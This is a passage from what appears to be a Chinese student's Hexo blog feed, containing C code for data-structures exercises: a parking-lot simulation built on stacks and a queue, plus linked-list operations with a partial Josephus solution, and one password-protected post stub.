(‘D’,1,15)，(‘A’,3,20)，(‘A’,4,25)，(‘A’,5,30)，(‘D’,2,35)，(‘D’,4,40)，(‘E’,0,0)。其中：’A’表示到达（Arrival)；’D’表示离去（Departure)；’E’表示输入结束（End)。<br>【实现提示】<br>需另设一个栈，临时停放为给要离去的汽车让路而从停车场退出来的汽车，也用顺序存储结构实现。输入数据按到达或离去的时刻有序。栈中的每个元素表示一辆汽车，包含两个数据项：汽车的牌照号码和进入停车场的时刻</p><p>草，这题咋有点超出我的能力范围</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><code class="hljs code">#include&lt;stdio.h&gt;<br>#include&lt;stdlib.h&gt;<br>#include&lt;malloc.h&gt;<br>typedef int Status;<br><br>typedef struct Car1&#123;<br>    int number;<br>    int arrive_time;<br>&#125;CarNode;<br><br>typedef struct&#123;<br>    CarNode *ebp;<br>    CarNode *esp;<br>    int stacksize;<br>&#125;Park;<br><br>typedef struct Car2&#123;<br>    int number,arrive_time;<br>    struct Car2 *next;<br>&#125;*CarPtr;<br><br>typedef struct&#123;<br>    CarPtr front;<br>    CarPtr rear;<br>    int length;<br>&#125;Shortcut;<br><br>int SInit(Park &amp;P)&#123;<br>    P.ebp=(CarNode*)malloc(5*sizeof(Car1));<br>    if(!P.ebp) exit(-2);<br>    P.esp=P.ebp;<br>    P.stacksize=0;<br>    return 1;<br>&#125;<br><br>int Push(Park &amp;P,CarNode e)&#123;<br>    *P.esp++=e;<br>    ++P.stacksize;<br>    return 1;<br>&#125;<br><br>int Pop(Park &amp;P,CarNode &amp;e)&#123;<br>    if(P.esp==P.ebp)<br>    printf(&quot;Th3 p@rk1ng lot 1s 3mpty!\n&quot;);<br>    else&#123;<br>        e=*--P.esp;<br>        P.stacksize--;<br>    &#125;<br>return 1;<br>&#125;<br><br>int InitQueue(Shortcut &amp;S)&#123;<br>    S.front=S.rear=(CarPtr)malloc(sizeof(Car2));<br>    if(!S.front||!S.rear) exit(-2);<br>    S.front-&gt;next=NULL;<br>    S.length=0;<br>    return 1;<br>&#125;<br><br>int EnQueue(Shortcut &amp;S,int number,int arrive_time)&#123;<br>    CarPtr p;<br>    p=(CarPtr)malloc(sizeof(Car2));<br>    if(!p) exit(-2);<br>    p-&gt;number=number;<br>    p-&gt;arrive_time=arrive_time;<br>    p-&gt;next=NULL;<br>    S.rear-&gt;next=p;<br>    S.rear=p;<br>    ++S.length;<br>    return 1;<br>&#125;<br><br>int DeQueue(Shortcut &amp;S,CarPtr &amp;w)&#123;<br>    if(S.length == 0)<br>    printf(&quot;Th3 s1d3w@y 1s 3mpty!\n&quot;);<br>    else&#123;<br>        w = S.front-&gt;next;<br>        S.front-&gt;next=S.front-&gt;next-&gt;next;<br>        --S.length;<br>    &#125;<br>    return 1;<br>&#125;<br><br>int Arrival(Park &amp;P,Shortcut &amp;S)&#123;<br>    int number,arrive_time;<br>    printf(&quot;请输入车牌号:&quot;);<br>    scanf(&quot;%d&quot;,&amp;number);<br>    printf(&quot;请输入进场时刻:&quot;);<br>    scanf(&quot;%d&quot;,&amp;arrive_time);<br>    if(P.stacksize&lt;5)&#123;<br>        CarNode c;<br>        c.number=number;<br>c.arrive_time=arrive_time;<br>Push(P,c);<br>printf(&quot;该车停在%d号车位.\n&quot;,P.stacksize);<br>&#125;<br>else&#123;<br>EnQueue(S,number,arrive_time);<br>printf(&quot;停车场已满,停在便道的第%d个位置.\n&quot;,S.length);<br>&#125;<br>return 1;<br>&#125;<br><br>int Leave(Park &amp;P,Park &amp;P1,Shortcut &amp;S)&#123;<br>int number,le_time,flag=1,money,arrive_time;<br>printf(&quot;请输入车牌号：&quot;);<br>scanf(&quot;%d&quot;,&amp;number);<br>printf(&quot;请输入离开时刻:&quot;);<br>scanf(&quot;%d&quot;,&amp;le_time);<br>CarNode e,m;<br>CarPtr w;<br>while(P.stacksize)&#123;<br>Pop(P,e);<br>if(e.number==number)&#123;<br>flag=0;<br>money=(le_time-e.arrive_time)*2;<br>arrive_time=e.arrive_time;<br>break;<br>&#125;<br>Push(P1,e);<br>&#125;<br>while(P1.stacksize)&#123;<br>Pop(P1,e);<br>Push(P,e);<br>&#125;<br>if (flag == 0)&#123;<br>if(S.length!=0)&#123;<br>DeQueue(S,w);<br>m.arrive_time=le_time;<br>m.number=w-&gt;number;<br>Push(P,m);<br>free(w);<br>printf(&quot;车牌号为%d的车从便道进入停车场\n&quot;,m.number);<br>&#125;<br>printf(&quot;停车费%d, 占用车位数%d\n&quot;,money,P.stacksize);<br>&#125;<br>else&#123;<br>printf(&quot;停车场不存在牌号为%d的车\n&quot;, number);<br>&#125;<br>return 1;<br>&#125;<br><br>int main()&#123;<br>int m=1;<br>char flag;<br>Park P,Q;<br>Shortcut S;<br>SInit(P);<br>SInit(Q);<br>InitQueue(S);<br>while(m)&#123;<br>printf(&quot;请选择(A(arrive),D(depature),E(end)): &quot;);<br>scanf(&quot;%c&quot;,&amp;flag);<br>switch(flag)&#123;<br>case &#x27;A&#x27;:<br>case &#x27;a&#x27;:<br>Arrival(P,S);break; <br>case &#x27;D&#x27;:<br>case &#x27;d&#x27;:<br>Leave(P,Q,S);break; <br>case &#x27;E&#x27;:<br>case &#x27;e&#x27;:<br>m=0;<br>break;<br>default:<br>printf(&quot;3rr0r!Please 1nput ag@1n\n&quot;);<br>break;<br>&#125;<br>while (flag != &#x27;\n&#x27;)<br>scanf(&quot;%c&quot;,&amp;flag);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>寄科</category>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄科</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>大道三千</title>
    <link href="/2021/10/05/%E5%A4%A7%E9%81%93%E4%B8%89%E5%8D%83/"/>
    <url>/2021/10/05/%E5%A4%A7%E9%81%93%E4%B8%89%E5%8D%83/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="59bd8d7bef8923b1fec91a56ab19a36540b5795f9e90a29de9d48c78ee61db3b"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">thr3e_th0u5@nd_4v3nues, 从书籍中获得的启发</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>大道三千</category>
      
    </categories>
    
    
    <tags>
      
      <tag>大道三千</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据结构第一次上鸡</title>
    <link href="/2021/09/26/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E9%93%BE%E8%A1%A8%E7%9A%84%E4%B8%8A%E9%B8%A1%E6%8A%A5%E5%91%8A/"/>
    <url>/2021/09/26/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E9%93%BE%E8%A1%A8%E7%9A%84%E4%B8%8A%E9%B8%A1%E6%8A%A5%E5%91%8A/</url>
    
    <content type="html"><![CDATA[<p>因为代码搓得太烂了，所以也记录一下遇到的问题吧。。大佬绕过</p><p>上鸡要求：搓个链表，然后实现增删改查、冒泡排序、约瑟夫问题、一元多项式计算</p><h2 id="代码大杂烩。。"><a href="#代码大杂烩。。" class="headerlink" title="代码大杂烩。。"></a>代码大杂烩。。</h2><h3 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>&#123;</span><br><span class="hljs-type">int</span> data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">next</span>=</span><span class="hljs-literal">NULL</span>;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Init</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Node *&amp;L,<span class="hljs-type">int</span> x[],<span class="hljs-type">int</span> len)</span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">p</span>=</span>((<span class="hljs-keyword">struct</span> Node*)(<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Node))));<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>L=p;<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>;i&lt;len;i++)&#123;<br>p-&gt;data=x[i];<br>p-&gt;next=((<span class="hljs-keyword">struct</span> Node*)(<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Node))));<br>p=p-&gt;next;<br>&#125;<br>p-&gt;next=<span class="hljs-literal">NULL</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;初始化成功！\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Node *&amp;L,<span class="hljs-type">int</span> num,<span class="hljs-type">int</span> d)</span>&#123;<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">a</span>=</span>((<span class="hljs-keyword">struct</span> Node*)(<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Node))));<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">p</span>=</span>L;<br><br><span class="hljs-keyword">while</span>(i&lt;num<span class="hljs-number">-1</span>)&#123;<br>p=p-&gt;next;<br>i++;<br>&#125;<br>a-&gt;next=p-&gt;next;<br>p-&gt;next=a;<br>a-&gt;data=d;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;插入成功！\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Delete</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Node *&amp;L,<span class="hljs-type">int</span> num)</span>&#123;<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>Node *p=L;<br><span class="hljs-keyword">if</span>(num==<span class="hljs-number">0</span>)&#123;<br>L=L-&gt;next;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">while</span>(i&lt;num<span class="hljs-number">-1</span>)&#123;<br>p=p-&gt;next;<br>i++;<br>&#125;<br>p-&gt;next=(p-&gt;next)-&gt;next;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;删除成功！\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Print</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Node *L)</span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">trans</span>=</span>L;<br><span class="hljs-keyword">if</span>(trans-&gt;next==<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;empty list!\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">while</span>(trans!=<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,trans-&gt;data);<br>trans=trans-&gt;next;<br><span class="hljs-keyword">if</span>(trans-&gt;next==<span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;显示完毕\n&quot;</span>); <br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">L</span>;</span><br><span class="hljs-type">int</span> num=<span class="hljs-number">5</span>,data=<span class="hljs-number">12</span>;<br><span class="hljs-type">int</span> x[]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>&#125;; <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;初始化：\n&quot;</span>);<br>Init(L,x,<span class="hljs-number">5</span>);<br>Print(L);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;向下标为2处插入元素12：\n&quot;</span>);<br>Insert(L,<span class="hljs-number">2</span>,data);<br>Print(L);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;依次删除元素：\n&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">-1</span>;i&lt;<span class="hljs-number">8</span>;i++)&#123;<br>Delete(L,<span class="hljs-number">0</span>);<br>Print(L);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="约瑟夫问题-损版"><a href="#约瑟夫问题-损版" class="headerlink" title="约瑟夫问题(损版)"></a>约瑟夫问题(损版)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>&#123;</span><br><span class="hljs-type">int</span> data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">next</span>=</span><span class="hljs-literal">NULL</span>;<br>&#125;;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Init</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Node *&amp;L,<span class="hljs-type">int</span> x[],<span class="hljs-type">int</span> len)</span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>*<span class="hljs-title">p</span>=</span>((<span class="hljs-keyword">struct</span> Node*)(<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Node))));<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>L=p;<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>;i&lt;len;i++)&#123;<br>p-&gt;data=x[i];<br>p-&gt;next=((<span class="hljs-keyword">struct</span> Node*)(<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Node))));<br>p=p-&gt;next;<br>&#125;<br>p-&gt;next=<span class="hljs-literal">NULL</span>; <br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fini5h3d\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Length</span><span class="hljs-params">(Node *L)</span>&#123;<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">while</span>(L-&gt;next!=<span class="hljs-literal">NULL</span>)&#123;<br>i++;<br>L=L-&gt;next;<br>&#125;<br><span class="hljs-keyword">return</span> i;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Node *&amp;L,<span class="hljs-type">int</span> num,<span class="hljs-type">int</span> d)</span>&#123;<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">a</span>=</span>((<span class="hljs-keyword">struct</span> Node*)(<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Node))));<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">p</span>=</span>L;<br><span class="hljs-keyword">while</span>(i&lt;num<span class="hljs-number">-1</span>)&#123;<br>p=p-&gt;next;<br>i++;<br>&#125;<br>a-&gt;next=p-&gt;next;<br>p-&gt;next=a;<br>a-&gt;data=d;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1n53rt 5ucc355!\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Delete</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Node *&amp;L,<span class="hljs-type">int</span> num)</span>&#123;<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>Node *p=L;<br>shit3:<span class="hljs-keyword">if</span>(num&lt;<span class="hljs-number">0</span>)&#123;<br>num=num+Length(*&amp;L);<br><span class="hljs-keyword">goto</span> shit3;<br>&#125;<br><span class="hljs-keyword">if</span>(num&gt;=Length(*&amp;L))&#123;<br>num=num%Length(*&amp;L);<br>&#125;<br><span class="hljs-keyword">if</span>(num==<span class="hljs-number">0</span>)&#123;<br>L=L-&gt;next;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">while</span>(i&lt;num<span class="hljs-number">-1</span>)&#123;<br>p=p-&gt;next;<br>i++;<br>&#125;<br>p-&gt;next=(p-&gt;next)-&gt;next;<br><span class="hljs-comment">//printf(&quot;D3l3t3 5ucc3553d!\n&quot;);</span><br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Print</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Node *L)</span>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">trans</span>=</span>L;<br><span class="hljs-keyword">if</span>(trans-&gt;next==<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;empty list!\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">while</span>(trans-&gt;next!=<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,trans-&gt;data);<br>trans=trans-&gt;next;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Pr1nt f1n15h3d\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">ChangeSpace</span><span class="hljs-params">(Node *&amp;L,<span class="hljs-type">int</span> a1,<span class="hljs-type">int</span> a2)</span>&#123;<br>Node *p=L;<br>Node *q=L;<br><span class="hljs-type">int</span> i; <br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;a1;i++)&#123;<br>p=p-&gt;next;   <span class="hljs-comment">//此时p到了下标a处</span><br>&#125;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;a2;i++)&#123;<br>q=q-&gt;next; 